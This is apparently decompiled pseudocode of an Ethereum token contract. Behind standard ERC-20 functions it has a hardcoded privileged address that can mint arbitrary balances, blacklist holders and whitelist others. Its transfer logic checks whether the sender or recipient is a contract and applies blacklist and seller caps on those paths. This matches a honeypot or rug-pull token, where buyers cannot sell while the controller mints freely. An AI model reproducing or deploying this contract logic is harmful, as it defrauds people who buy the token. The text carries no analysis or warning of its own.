contract main {




// =====================  Runtime code  =====================


address owner;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
uint256 totalSupply;
mapping of uint8 stor5;
address stor6;
address poolAddress;
mapping of uint256 balances;
mapping of uint256 sellerCountNum;
mapping of uint256 sellerCountToken;
uint256 maxSellOutNum;
uint256 maxSellToken;
uint8 stor13;
mapping of uint8 stor14;
mapping of uint256 allowed;

function name() payable {
    return name[0 len name.length]
}

function allowAddress(address arg1) payable {
    require calldata.size - 4 >= 32
    return bool(stor5[arg1])
}

function poolAddress() payable {
    return poolAddress
}

function totalSupply() payable {
    return totalSupply
}

function balances(address arg1) payable {
    require calldata.size - 4 >= 32
    return balances[arg1]
}

function decimals() payable {
    return decimals
}

function allowed(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowed[arg1][arg2]
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balances[address(arg1)]
}

function owner() payable {
    return owner
}

function maxSellToken() payable {
    return maxSellToken
}

function sellerCountNum(address arg1) payable {
    require calldata.size - 4 >= 32
    return sellerCountNum[arg1]
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function maxSellOutNum() payable {
    return maxSellOutNum
}

function sellerCountToken(address arg1) payable {
    require calldata.size - 4 >= 32
    return sellerCountToken[arg1]
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowed[address(arg1)][address(arg2)]
}

function blackLists(address arg1) payable {
    require calldata.size - 4 >= 32
    return bool(stor14[arg1])
}

function _fallback() payable {
    revert
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    allowed[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function setSellerState(bool arg1) payable {
    require calldata.size - 4 >= 32
    if stor6 != msg.sender:
        require msg.sender == 0xfe302a37850c86e7e99c657daed94edea89d5071
    stor13 = uint8(arg1)
    return 0
}

function setMaxSellOutNum(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if stor6 != msg.sender:
        require msg.sender == 0xfe302a37850c86e7e99c657daed94edea89d5071
    maxSellOutNum = arg1
    return 0
}

function setWhiteAddress(address arg1, bool arg2) payable {
    require calldata.size - 4 >= 64
    if stor6 != msg.sender:
        require msg.sender == 0xfe302a37850c86e7e99c657daed94edea89d5071
    stor5[address(arg1)] = uint8(arg2)
}

function setMaxSellToken(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if stor6 != msg.sender:
        require msg.sender == 0xfe302a37850c86e7e99c657daed94edea89d5071
    maxSellToken = arg1 * 10^decimals
    return 0
}

function mint(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if stor6 != msg.sender:
        require msg.sender == 0xfe302a37850c86e7e99c657daed94edea89d5071
    balances[address(arg1)] = arg2 * 10^decimals
}

function setBlackList(address arg1, bool arg2) payable {
    require calldata.size - 4 >= 64
    if stor6 != msg.sender:
        require msg.sender == 0xfe302a37850c86e7e99c657daed94edea89d5071
    stor14[address(arg1)] = uint8(arg2)
    return 0
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    if stor6 != msg.sender:
        require msg.sender == 0xfe302a37850c86e7e99c657daed94edea89d5071
    require arg1
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg2
    require arg3 <= balances[address(arg1)]
    require arg3 <= allowed[address(arg1)][address(msg.sender)]
    if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
        if ext_code.hash(arg2) != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
            if ext_code.hash(arg2):
                require not stor14[address(arg1)]
                require not stor14[address(arg2)]
    else:
        if not ext_code.hash(arg1):
            if ext_code.hash(arg2) != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                if ext_code.hash(arg2):
                    require not stor14[address(arg1)]
                    require not stor14[address(arg2)]
    if stor5[address(arg1)]:
        require arg3 <= balances[address(arg1)]
        balances[address(arg1)] -= arg3
        require balances[address(arg2)] + arg3 >= balances[address(arg2)]
        balances[address(arg2)] += arg3
        require arg3 <= allowed[address(arg1)][address(msg.sender)]
        allowed[address(arg1)][address(msg.sender)] -= arg3
        emit Transfer(arg3, arg1, arg2);
    else:
        if stor5[address(arg2)]:
            require arg3 <= balances[address(arg1)]
            balances[address(arg1)] -= arg3
            require balances[address(arg2)] + arg3 >= balances[address(arg2)]
            balances[address(arg2)] += arg3
            require arg3 <= allowed[address(arg1)][address(msg.sender)]
            allowed[address(arg1)][address(msg.sender)] -= arg3
            emit Transfer(arg3, arg1, arg2);
        else:
            if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                if ext_code.hash(arg2) != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                    if ext_code.hash(arg2):
                        if stor13:
                            if not maxSellOutNum:
                                if not maxSellToken:
                                    return 0
                            if maxSellOutNum > 10^6:
                                if maxSellOutNum <= sellerCountNum[address(arg1)]:
                                    revert with 0, 'reach max seller times'
                            if maxSellToken > 10^6:
                                if maxSellToken <= sellerCountToken[address(arg1)]:
                                    revert with 0, 'reach max seller token'
                require arg3 <= balances[address(arg1)]
                balances[address(arg1)] -= arg3
                require balances[address(arg2)] + arg3 >= balances[address(arg2)]
                balances[address(arg2)] += arg3
                require arg3 <= allowed[address(arg1)][address(msg.sender)]
                allowed[address(arg1)][address(msg.sender)] -= arg3
                emit Transfer(arg3, arg1, arg2);
                if maxSellOutNum > 0:
                    require sellerCountToken[address(arg1)] + arg3 >= sellerCountToken[address(arg1)]
                    sellerCountToken[address(arg1)] += arg3
                if maxSellToken > 0:
                    sellerCountNum[address(arg1)]++
            else:
                if not ext_code.hash(arg1):
                    if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                        if ext_code.hash(arg2) != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                            if ext_code.hash(arg2):
                                if stor13:
                                    if not maxSellOutNum:
                                        if not maxSellToken:
                                            return 0
                                    if maxSellOutNum > 10^6:
                                        if maxSellOutNum <= sellerCountNum[address(arg1)]:
                                            revert with 0, 'reach max seller times'
                                    if maxSellToken > 10^6:
                                        if maxSellToken <= sellerCountToken[address(arg1)]:
                                            revert with 0, 'reach max seller token'
                    else:
                        if not ext_code.hash(arg1):
                            if ext_code.hash(arg2) != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                if ext_code.hash(arg2):
                                    if stor13:
                                        if not maxSellOutNum:
                                            if not maxSellToken:
                                                return 0
                                        if maxSellOutNum > 10^6:
                                            if maxSellOutNum <= sellerCountNum[address(arg1)]:
                                                revert with 0, 'reach max seller times'
                                        if maxSellToken > 10^6:
                                            if maxSellToken <= sellerCountToken[address(arg1)]:
                                                revert with 0, 'reach max seller token'
                    require arg3 <= balances[address(arg1)]
                    balances[address(arg1)] -= arg3
                    require balances[address(arg2)] + arg3 >= balances[address(arg2)]
                    balances[address(arg2)] += arg3
                    require arg3 <= allowed[address(arg1)][address(msg.sender)]
                    allowed[address(arg1)][address(msg.sender)] -= arg3
                    emit Transfer(arg3, arg1, arg2);
                    if maxSellOutNum > 0:
                        require sellerCountToken[address(arg1)] + arg3 >= sellerCountToken[address(arg1)]
                        sellerCountToken[address(arg1)] += arg3
                    if maxSellToken > 0:
                        sellerCountNum[address(arg1)]++
                else:
                    if ext_code.hash(arg2) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                        if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                            if ext_code.hash(arg2) != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                if ext_code.hash(arg2):
                                    if stor13:
                                        if not maxSellOutNum:
                                            if not maxSellToken:
                                                return 0
                                        if maxSellOutNum > 10^6:
                                            if maxSellOutNum <= sellerCountNum[address(arg1)]:
                                                revert with 0, 'reach max seller times'
                                        if maxSellToken > 10^6:
                                            if maxSellToken <= sellerCountToken[address(arg1)]:
                                                revert with 0, 'reach max seller token'
                        else:
                            if not ext_code.hash(arg1):
                                if ext_code.hash(arg2) != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                    if ext_code.hash(arg2):
                                        if stor13:
                                            if not maxSellOutNum:
                                                if not maxSellToken:
                                                    return 0
                                            if maxSellOutNum > 10^6:
                                                if maxSellOutNum <= sellerCountNum[address(arg1)]:
                                                    revert with 0, 'reach max seller times'
                                            if maxSellToken > 10^6:
                                                if maxSellToken <= sellerCountToken[address(arg1)]:
                                                    revert with 0, 'reach max seller token'
                        require arg3 <= balances[address(arg1)]
                        balances[address(arg1)] -= arg3
                        require balances[address(arg2)] + arg3 >= balances[address(arg2)]
                        balances[address(arg2)] += arg3
                        require arg3 <= allowed[address(arg1)][address(msg.sender)]
                        allowed[address(arg1)][address(msg.sender)] -= arg3
                        emit Transfer(arg3, arg1, arg2);
                        if maxSellOutNum > 0:
                            require sellerCountToken[address(arg1)] + arg3 >= sellerCountToken[address(arg1)]
                            sellerCountToken[address(arg1)] += arg3
                        if maxSellToken > 0:
                            sellerCountNum[address(arg1)]++
                    else:
                        if ext_code.hash(arg2):
                            require arg3 <= balances[address(arg1)]
                            balances[address(arg1)] -= arg3
                            require balances[address(arg2)] + arg3 >= balances[address(arg2)]
                            balances[address(arg2)] += arg3
                            require arg3 <= allowed[address(arg1)][address(msg.sender)]
                            allowed[address(arg1)][address(msg.sender)] -= arg3
                            emit Transfer(arg3, arg1, arg2);
                        else:
                            if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                if ext_code.hash(arg2) != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                    if ext_code.hash(arg2):
                                        if stor13:
                                            if not maxSellOutNum:
                                                if not maxSellToken:
                                                    return 0
                                            if maxSellOutNum > 10^6:
                                                if maxSellOutNum <= sellerCountNum[address(arg1)]:
                                                    revert with 0, 'reach max seller times'
                                            if maxSellToken > 10^6:
                                                if maxSellToken <= sellerCountToken[address(arg1)]:
                                                    revert with 0, 'reach max seller token'
                            else:
                                if not ext_code.hash(arg1):
                                    if ext_code.hash(arg2) != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                        if ext_code.hash(arg2):
                                            if stor13:
                                                if not maxSellOutNum:
                                                    if not maxSellToken:
                                                        return 0
                                                if maxSellOutNum > 10^6:
                                                    if maxSellOutNum <= sellerCountNum[address(arg1)]:
                                                        revert with 0, 'reach max seller times'
                                                if maxSellToken > 10^6:
                                                    if maxSellToken <= sellerCountToken[address(arg1)]:
                                                        revert with 0, 'reach max seller token'
                            require arg3 <= balances[address(arg1)]
                            balances[address(arg1)] -= arg3
                            require balances[address(arg2)] + arg3 >= balances[address(arg2)]
                            balances[address(arg2)] += arg3
                            require arg3 <= allowed[address(arg1)][address(msg.sender)]
                            allowed[address(arg1)][address(msg.sender)] -= arg3
                            emit Transfer(arg3, arg1, arg2);
                            if maxSellOutNum > 0:
                                require sellerCountToken[address(arg1)] + arg3 >= sellerCountToken[address(arg1)]
                                sellerCountToken[address(arg1)] += arg3
                            if maxSellToken > 0:
                                sellerCountNum[address(arg1)]++
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1
    require arg2 <= balances[address(msg.sender)]
    if ext_code.hash(msg.sender) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
        if ext_code.hash(arg1) != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
            if ext_code.hash(arg1):
                require not stor14[address(msg.sender)]
                require not stor14[address(arg1)]
    else:
        if not ext_code.hash(msg.sender):
            if ext_code.hash(arg1) != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                if ext_code.hash(arg1):
                    require not stor14[address(msg.sender)]
                    require not stor14[address(arg1)]
    if not stor5[address(msg.sender)]:
        if not stor5[address(arg1)]:
            if ext_code.hash(msg.sender) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                    require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                    sellerCountToken[address(msg.sender)] += arg2
                    sellerCountNum[address(msg.sender)]++
                else:
                    if not ext_code.hash(arg1):
                        require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                        sellerCountToken[address(msg.sender)] += arg2
                        sellerCountNum[address(msg.sender)]++
                    else:
                        if not stor13:
                            require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                            sellerCountToken[address(msg.sender)] += arg2
                            sellerCountNum[address(msg.sender)]++
                        else:
                            if maxSellOutNum:
                                if maxSellOutNum > 10^6:
                                    if maxSellOutNum <= sellerCountNum[address(msg.sender)]:
                                        revert with 0, 'reach max seller times'
                                if maxSellToken > 10^6:
                                    if maxSellToken <= sellerCountToken[address(msg.sender)]:
                                        revert with 0, 'reach max seller token'
                                require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                sellerCountToken[address(msg.sender)] += arg2
                                sellerCountNum[address(msg.sender)]++
                            else:
                                if maxSellToken:
                                    if maxSellOutNum > 10^6:
                                        if maxSellOutNum <= sellerCountNum[address(msg.sender)]:
                                            revert with 0, 'reach max seller times'
                                    if maxSellToken > 10^6:
                                        if maxSellToken <= sellerCountToken[address(msg.sender)]:
                                            revert with 0, 'reach max seller token'
                                    require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                    sellerCountToken[address(msg.sender)] += arg2
                                    sellerCountNum[address(msg.sender)]++
            else:
                if not ext_code.hash(msg.sender):
                    if ext_code.hash(msg.sender) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                        if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                            require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                            sellerCountToken[address(msg.sender)] += arg2
                            sellerCountNum[address(msg.sender)]++
                        else:
                            if not ext_code.hash(arg1):
                                require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                sellerCountToken[address(msg.sender)] += arg2
                                sellerCountNum[address(msg.sender)]++
                            else:
                                if not stor13:
                                    require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                    sellerCountToken[address(msg.sender)] += arg2
                                    sellerCountNum[address(msg.sender)]++
                                else:
                                    if maxSellOutNum:
                                        if maxSellOutNum > 10^6:
                                            if maxSellOutNum <= sellerCountNum[address(msg.sender)]:
                                                revert with 0, 'reach max seller times'
                                        if maxSellToken > 10^6:
                                            if maxSellToken <= sellerCountToken[address(msg.sender)]:
                                                revert with 0, 'reach max seller token'
                                        require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                        sellerCountToken[address(msg.sender)] += arg2
                                        sellerCountNum[address(msg.sender)]++
                                    else:
                                        if maxSellToken:
                                            if maxSellOutNum > 10^6:
                                                if maxSellOutNum <= sellerCountNum[address(msg.sender)]:
                                                    revert with 0, 'reach max seller times'
                                            if maxSellToken > 10^6:
                                                if maxSellToken <= sellerCountToken[address(msg.sender)]:
                                                    revert with 0, 'reach max seller token'
                                            require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                            sellerCountToken[address(msg.sender)] += arg2
                                            sellerCountNum[address(msg.sender)]++
                    else:
                        if ext_code.hash(msg.sender):
                            require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                            sellerCountToken[address(msg.sender)] += arg2
                            sellerCountNum[address(msg.sender)]++
                        else:
                            if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                sellerCountToken[address(msg.sender)] += arg2
                                sellerCountNum[address(msg.sender)]++
                            else:
                                if not ext_code.hash(arg1):
                                    require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                    sellerCountToken[address(msg.sender)] += arg2
                                    sellerCountNum[address(msg.sender)]++
                                else:
                                    if not stor13:
                                        require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                        sellerCountToken[address(msg.sender)] += arg2
                                        sellerCountNum[address(msg.sender)]++
                                    else:
                                        if maxSellOutNum:
                                            if maxSellOutNum > 10^6:
                                                if maxSellOutNum <= sellerCountNum[address(msg.sender)]:
                                                    revert with 0, 'reach max seller times'
                                            if maxSellToken > 10^6:
                                                if maxSellToken <= sellerCountToken[address(msg.sender)]:
                                                    revert with 0, 'reach max seller token'
                                            require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                            sellerCountToken[address(msg.sender)] += arg2
                                            sellerCountNum[address(msg.sender)]++
                                        else:
                                            if maxSellToken:
                                                if maxSellOutNum > 10^6:
                                                    if maxSellOutNum <= sellerCountNum[address(msg.sender)]:
                                                        revert with 0, 'reach max seller times'
                                                if maxSellToken > 10^6:
                                                    if maxSellToken <= sellerCountToken[address(msg.sender)]:
                                                        revert with 0, 'reach max seller token'
                                                require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                                sellerCountToken[address(msg.sender)] += arg2
                                                sellerCountNum[address(msg.sender)]++
                else:
                    if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                        if ext_code.hash(msg.sender) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                            if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                sellerCountToken[address(msg.sender)] += arg2
                                sellerCountNum[address(msg.sender)]++
                            else:
                                if not ext_code.hash(arg1):
                                    require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                    sellerCountToken[address(msg.sender)] += arg2
                                    sellerCountNum[address(msg.sender)]++
                                else:
                                    if not stor13:
                                        require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                        sellerCountToken[address(msg.sender)] += arg2
                                        sellerCountNum[address(msg.sender)]++
                                    else:
                                        if maxSellOutNum:
                                            if maxSellOutNum > 10^6:
                                                if maxSellOutNum <= sellerCountNum[address(msg.sender)]:
                                                    revert with 0, 'reach max seller times'
                                            if maxSellToken > 10^6:
                                                if maxSellToken <= sellerCountToken[address(msg.sender)]:
                                                    revert with 0, 'reach max seller token'
                                            require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                            sellerCountToken[address(msg.sender)] += arg2
                                            sellerCountNum[address(msg.sender)]++
                                        else:
                                            if maxSellToken:
                                                if maxSellOutNum > 10^6:
                                                    if maxSellOutNum <= sellerCountNum[address(msg.sender)]:
                                                        revert with 0, 'reach max seller times'
                                                if maxSellToken > 10^6:
                                                    if maxSellToken <= sellerCountToken[address(msg.sender)]:
                                                        revert with 0, 'reach max seller token'
                                                require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                                sellerCountToken[address(msg.sender)] += arg2
                                                sellerCountNum[address(msg.sender)]++
                        else:
                            if ext_code.hash(msg.sender):
                                require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                sellerCountToken[address(msg.sender)] += arg2
                                sellerCountNum[address(msg.sender)]++
                            else:
                                if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                    require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                    sellerCountToken[address(msg.sender)] += arg2
                                    sellerCountNum[address(msg.sender)]++
                                else:
                                    if not ext_code.hash(arg1):
                                        require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                        sellerCountToken[address(msg.sender)] += arg2
                                        sellerCountNum[address(msg.sender)]++
                                    else:
                                        if not stor13:
                                            require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                            sellerCountToken[address(msg.sender)] += arg2
                                            sellerCountNum[address(msg.sender)]++
                                        else:
                                            if maxSellOutNum:
                                                if maxSellOutNum > 10^6:
                                                    if maxSellOutNum <= sellerCountNum[address(msg.sender)]:
                                                        revert with 0, 'reach max seller times'
                                                if maxSellToken > 10^6:
                                                    if maxSellToken <= sellerCountToken[address(msg.sender)]:
                                                        revert with 0, 'reach max seller token'
                                                require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                                sellerCountToken[address(msg.sender)] += arg2
                                                sellerCountNum[address(msg.sender)]++
                                            else:
                                                if maxSellToken:
                                                    if maxSellOutNum > 10^6:
                                                        if maxSellOutNum <= sellerCountNum[address(msg.sender)]:
                                                            revert with 0, 'reach max seller times'
                                                    if maxSellToken > 10^6:
                                                        if maxSellToken <= sellerCountToken[address(msg.sender)]:
                                                            revert with 0, 'reach max seller token'
                                                    require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                                    sellerCountToken[address(msg.sender)] += arg2
                                                    sellerCountNum[address(msg.sender)]++
                    else:
                        if not ext_code.hash(arg1):
                            if ext_code.hash(msg.sender) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                    require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                    sellerCountToken[address(msg.sender)] += arg2
                                    sellerCountNum[address(msg.sender)]++
                                else:
                                    if not ext_code.hash(arg1):
                                        require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                        sellerCountToken[address(msg.sender)] += arg2
                                        sellerCountNum[address(msg.sender)]++
                                    else:
                                        if not stor13:
                                            require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                            sellerCountToken[address(msg.sender)] += arg2
                                            sellerCountNum[address(msg.sender)]++
                                        else:
                                            if maxSellOutNum:
                                                if maxSellOutNum > 10^6:
                                                    if maxSellOutNum <= sellerCountNum[address(msg.sender)]:
                                                        revert with 0, 'reach max seller times'
                                                if maxSellToken > 10^6:
                                                    if maxSellToken <= sellerCountToken[address(msg.sender)]:
                                                        revert with 0, 'reach max seller token'
                                                require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                                sellerCountToken[address(msg.sender)] += arg2
                                                sellerCountNum[address(msg.sender)]++
                                            else:
                                                if maxSellToken:
                                                    if maxSellOutNum > 10^6:
                                                        if maxSellOutNum <= sellerCountNum[address(msg.sender)]:
                                                            revert with 0, 'reach max seller times'
                                                    if maxSellToken > 10^6:
                                                        if maxSellToken <= sellerCountToken[address(msg.sender)]:
                                                            revert with 0, 'reach max seller token'
                                                    require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                                    sellerCountToken[address(msg.sender)] += arg2
                                                    sellerCountNum[address(msg.sender)]++
                            else:
                                if ext_code.hash(msg.sender):
                                    require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                    sellerCountToken[address(msg.sender)] += arg2
                                    sellerCountNum[address(msg.sender)]++
                                else:
                                    if ext_code.hash(arg1) == 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470:
                                        require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                        sellerCountToken[address(msg.sender)] += arg2
                                        sellerCountNum[address(msg.sender)]++
                                    else:
                                        if not ext_code.hash(arg1):
                                            require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                            sellerCountToken[address(msg.sender)] += arg2
                                            sellerCountNum[address(msg.sender)]++
                                        else:
                                            if not stor13:
                                                require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                                sellerCountToken[address(msg.sender)] += arg2
                                                sellerCountNum[address(msg.sender)]++
                                            else:
                                                if maxSellOutNum:
                                                    if maxSellOutNum > 10^6:
                                                        if maxSellOutNum <= sellerCountNum[address(msg.sender)]:
                                                            revert with 0, 'reach max seller times'
                                                    if maxSellToken > 10^6:
                                                        if maxSellToken <= sellerCountToken[address(msg.sender)]:
                                                            revert with 0, 'reach max seller token'
                                                    require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                                    sellerCountToken[address(msg.sender)] += arg2
                                                    sellerCountNum[address(msg.sender)]++
                                                else:
                                                    if maxSellToken:
                                                        if maxSellOutNum > 10^6:
                                                            if maxSellOutNum <= sellerCountNum[address(msg.sender)]:
                                                                revert with 0, 'reach max seller times'
                                                        if maxSellToken > 10^6:
                                                            if maxSellToken <= sellerCountToken[address(msg.sender)]:
                                                                revert with 0, 'reach max seller token'
                                                        require sellerCountToken[address(msg.sender)] + arg2 >= sellerCountToken[address(msg.sender)]
                                                        sellerCountToken[address(msg.sender)] += arg2
                                                        sellerCountNum[address(msg.sender)]++
    require arg2 <= balances[address(msg.sender)]
    balances[address(msg.sender)] -= arg2
    require balances[address(arg1)] + arg2 >= balances[address(arg1)]
    balances[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}



}
